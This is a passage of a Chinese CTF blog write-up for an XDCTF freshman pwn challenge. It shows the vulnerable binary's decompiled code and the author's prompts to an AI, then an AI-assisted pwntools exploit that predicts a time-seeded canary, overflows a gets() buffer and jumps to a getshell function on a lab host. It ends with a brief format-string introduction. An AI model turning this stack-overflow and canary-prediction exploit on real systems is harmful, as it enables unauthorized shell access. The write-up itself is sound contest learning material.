+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">可能需要使用 Python ctypes 包来直接调用 C 库函数。
+</span></span><span class="line"><span class="cl">main函数C伪代码：
+</span></span><span class="line"><span class="cl">int __fastcall main(int argc, const char **argv, const char **envp)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  char s[124]; // [rsp+0h] [rbp-90h] BYREF
+</span></span><span class="line"><span class="cl">  int v5; // [rsp+7Ch] [rbp-14h]
+</span></span><span class="line"><span class="cl">  int v6; // [rsp+8Ch] [rbp-4h]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  init(argc, argv, envp);
+</span></span><span class="line"><span class="cl">  puts(&#34;Welcome to Secret Message Book!&#34;);
+</span></span><span class="line"><span class="cl">  puts(&#34;Do you want to brute-force this system? (y/n)&#34;);
+</span></span><span class="line"><span class="cl">  fgets(&amp;brute_choice, 8, stdin);
+</span></span><span class="line"><span class="cl">  v6 = 0;
+</span></span><span class="line"><span class="cl">  if ( brute_choice == 121 || brute_choice == 89 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v6 = 1;
+</span></span><span class="line"><span class="cl">    canary = (int)random() % 114514;
+</span></span><span class="line"><span class="cl">    v5 = canary;
+</span></span><span class="line"><span class="cl">    puts(&#34;waiting...&#34;);
+</span></span><span class="line"><span class="cl">    sleep(1u);
+</span></span><span class="line"><span class="cl">    puts(&#34;boom!&#34;);
+</span></span><span class="line"><span class="cl">    puts(&#34;Brute-force mode enabled! Security on.&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    puts(&#34;Normal mode. No overflow allowed.&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  printf(&#34;Enter your message: &#34;);
+</span></span><span class="line"><span class="cl">  if ( v6 )
+</span></span><span class="line"><span class="cl">    gets(s);
+</span></span><span class="line"><span class="cl">  else
+</span></span><span class="line"><span class="cl">    fgets(s, 128, stdin);
+</span></span><span class="line"><span class="cl">  if ( v6 &amp;&amp; v5 != canary )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    puts(&#34;Security check failed!&#34;);
+</span></span><span class="line"><span class="cl">    exit(1);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  puts(&#34;Message received.&#34;);
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">怎么爆破canary,绕过检查，这是我的大致exp框架：
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对话2：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exp:
+</span></span><span class="line"><span class="cl">from ctypes import CDLL, cdll
+</span></span><span class="line"><span class="cl">import time
+</span></span><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+</span></span><span class="line"><span class="cl">io = remote(&#39;192.168.149.1&#39;,)
+</span></span><span class="line"><span class="cl">getshell = 0x401276
+</span></span><span class="line"><span class="cl">ret = 0x000000000040101a
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">io.recvuntil(b&#39;Do you want to brute-force this system? (y/n)&#39;)
+</span></span><span class="line"><span class="cl">io.sendline(b&#39;y&#39;)
+</span></span><span class="line"><span class="cl">io.recvuntil(b&#39;Enter your message: &#39;)
+</span></span><span class="line"><span class="cl">payload = (cyclic(124) + p32(canary)).ljust(0x90,b&#39;\x00&#39;) + p64(ret) + p64(getshell)
+</span></span><span class="line"><span class="cl">io.interactive()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">现在就差爆破canary,我的思路是有一个循环语句让payload一直循环连接io然后不停尝试栈溢出到canary值,canary值一直尝试,直到能绕过检查getshell,以下是IDA中的C伪代码:
+</span></span><span class="line"><span class="cl">int __fastcall main(int argc, const char **argv, const char **envp)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  char s[124]; // [rsp+0h] [rbp-90h] BYREF
+</span></span><span class="line"><span class="cl">  int v5; // [rsp+7Ch] [rbp-14h]
+</span></span><span class="line"><span class="cl">  int v6; // [rsp+8Ch] [rbp-4h]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  init(argc, argv, envp);
+</span></span><span class="line"><span class="cl">  puts(&#34;Welcome to Secret Message Book!&#34;);
+</span></span><span class="line"><span class="cl">  puts(&#34;Do you want to brute-force this system? (y/n)&#34;);
+</span></span><span class="line"><span class="cl">  fgets(&amp;brute_choice, 8, stdin);
+</span></span><span class="line"><span class="cl">  v6 = 0;
+</span></span><span class="line"><span class="cl">  if ( brute_choice == 121 || brute_choice == 89 )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    v6 = 1;
+</span></span><span class="line"><span class="cl">    canary = (int)random() % 114514;
+</span></span><span class="line"><span class="cl">    v5 = canary;
+</span></span><span class="line"><span class="cl">    puts(&#34;waiting...&#34;);
+</span></span><span class="line"><span class="cl">    sleep(1u);
+</span></span><span class="line"><span class="cl">    puts(&#34;boom!&#34;);
+</span></span><span class="line"><span class="cl">    puts(&#34;Brute-force mode enabled! Security on.&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    puts(&#34;Normal mode. No overflow allowed.&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  printf(&#34;Enter your message: &#34;);
+</span></span><span class="line"><span class="cl">  if ( v6 )
+</span></span><span class="line"><span class="cl">    gets(s);
+</span></span><span class="line"><span class="cl">  else
+</span></span><span class="line"><span class="cl">    fgets(s, 128, stdin);
+</span></span><span class="line"><span class="cl">  if ( v6 &amp;&amp; v5 != canary )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    puts(&#34;Security check failed!&#34;);
+</span></span><span class="line"><span class="cl">    exit(1);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  puts(&#34;Message received.&#34;);
+</span></span><span class="line"><span class="cl">  return 0;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">代码块不加注释,只用在外面加以解释
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>逻辑解释(AI解答)：</strong></p>
+<ol>
+<li><strong>种子范围确定</strong>：程序中 Canary 由<code>random() % 114514</code>生成，而<code>random()</code>的序列由<code>seed</code>决定。通过当前时间<code>now</code>及附近值（前后 5 秒）作为种子，覆盖程序启动时可能使用的种子范围。</li>
+<li><strong>循环尝试</strong>：对每个种子生成对应的 Canary 值，重新建立连接并发送包含该 Canary 的 payload。</li>
+<li><strong>payload 构造</strong>：按<code>缓冲区(124字节) + Canary(32位) + 填充至0x90长度 + ret指令(栈对齐) + getshell地址</code>的结构构造，确保绕过 Canary 检查后跳转到目标函数。</li>
+<li><strong>结果判断</strong>：若发送后成功进入交互模式，说明 Canary 正确并 getshell；否则关闭连接继续尝试下一个可能值。</li>
+</ol>
+<p>稍微修改一下就好。</p>
+<p>exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getshell</span> <span class="o">=</span> <span class="mh">0x40127b</span>
+</span></span><span class="line"><span class="cl"><span class="n">now</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,</span> <span class="mi">4131</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Do you want to brute-force this system? (y/n)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your message: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">seed</span> <span class="ow">in</span> <span class="p">[</span><span class="n">now</span><span class="p">,</span> <span class="n">now</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">now</span><span class="o">+</span><span class="mi">1</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">srandom</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">canary</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">114514</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">124</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">getshell</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">WARN_TEXT</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] Canary </span><span class="si">{</span><span class="n">canary</span><span class="si">}</span><span class="s2"> failed,next one&#34;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这题给到我的压力很大，一度让我陷入自我怀疑&hellip;我在想XDCTF新生赛都这么难，感觉都涉及算法“超纲”了，在我看来这也是体现我们学习能力的一方面，及时利用AI补全，学会如何用AI补全脚本、解析代码也是一种CTFer的必不可少的一种技巧！</p>
+<h3 id="fmt">fmt
+</h3><hr>
+<p>格式化字符串是一种在编程中用于控制输出格式的技术。在C语言中，格式化字符串通常与 printf、scanf、sprintf 等函数一起使用。</p>
+<p>如果我们能控制格式化字符串，含有各种格式说明符（形如%s,%p），并且不提供后续参数，程序会从哪里找来一个“虚空”参数？这可能导致意想不到的结果！</p>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 2025-11-06
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/moectf_2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/moectf_2024/moectf2024.cc156646db374bf0b7ce7c58c0298814_hu_50f438f2977ee422.webp" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Moectf_2024"
+                        
+                        data-hash="md5-zBVmRts3S/C3znxYwCmIFA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Moectf_2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025bjtuctf-pwn/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025BJTUCTF-PWN"
+                        
+                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025BJTUCTF-PWN</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo.57f578867e8bf9f96693f81b752ff4be_hu_fe2af2939c64f881.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025强网杯"
+                        
+                        data-hash="md5-V/V4hn6L&#43;flmk/gbdS/0vg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025强网杯</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.521ea07b270c9bd08b40b043442201c4_hu_e37e9b7340f094d8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 第二次AWD水友赛"
+                        
+                        data-hash="md5-Uh6geycMm9CLQLBDRCIBxA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第二次AWD水友赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 第一次AWD水友赛"
+                        
+                        data-hash="md5-6pl/gHcHxpogH&#43;24KAFVag==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第一次AWD水友赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
+    data-repo-id="R_kgDOPd0X7g"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPd0X7s4CuMr6"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="en"
+    data-loading=""
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('light');
+            } else {
+                setGiscusTheme('dark');
+            }
+        }
+    })();
+</script>
+
+    
+
+    
+<script defer src="https://events.vercount.one/js"></script>
+<footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Expl0rer.Ct
+    </section>
+    
+    <section class="powerby">
+        
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<section class="wordcount">
+  <div class="wordcount-row">
+    <p>博主发布了18篇文章  ||</p>
+    <p>总共244.81k 字</p>
+  </div>
+</section>
+        
+  
+
+
+<a>总访客数: </a><span id='busuanzi_value_site_uv'>别急在加载中了...</span> <a> | </a> <a>总访问量: </a><span id='busuanzi_value_site_pv'>加载中...</span></br>
+
+
+
+<div class="site-uptime-container">
+  <span id="timeDate" class="site-uptime-text">载入天数...</span>
+  <span id="times" class="site-uptime-text">载入时分秒...</span>
+</div>
+
+<script language="javascript"> 
+    var now = new Date();
+    function createtime(){
+        now.setTime(now.getTime()+250); 
+        var grt= new Date("2025/08/01 00:00:00"); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24;
+        dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+        hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
+        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes);
+        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds);
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+
+        document.getElementById("timeDate").innerHTML = "本站已稳定运行"+dnum+" 天 ";document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"
+    }
+    setInterval("createtime()",250); 
+</script> 
+
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+<head>
+  
+  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
+  <link 
+    href="https://fonts.font.im/css?family=PT+Sans" 
+    rel="stylesheet"
+    media="print" 
+    onload="this.media='all'"
+    id="font-cn"
+  >
+  
+  
+  <link 
+    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
+    rel="stylesheet"
+    media="print" 
+    onload="this.media='all'"
+    id="font-en"
+    disabled
+  >
+  
+  <script>
+    
+    document.querySelector('#font-cn').addEventListener('load', function() {
+      document.querySelector('#font-en').disabled = true;
+    }).addEventListener('error', function() {
+      document.querySelector('#font-en').disabled = false;
+      document.querySelector('#font-en').media = 'all';
+    });
+  </script>
+  
+  <noscript>
+    <link 
+      href="https://fonts.font.im/css?family=PT+Sans" 
+      rel="stylesheet"
+    >
+  </noscript>
+</head>
+
+<style>
+    #TableOfContents > ul ul,
+    #TableOfContents > ul ol,
+    #TableOfContents > ol ul,
+    #TableOfContents > ol ol {
+        display: none;
+    }
+    #TableOfContents > ul .open,
+    #TableOfContents > ol .open {
+        display: block;
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        window.addEventListener('scroll', function() {
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                const parent = ul.parentElement;
+                ul = parent ? parent.parentElement : null;
+            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://expl0rer.top/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        let btn = document.createElement("div");
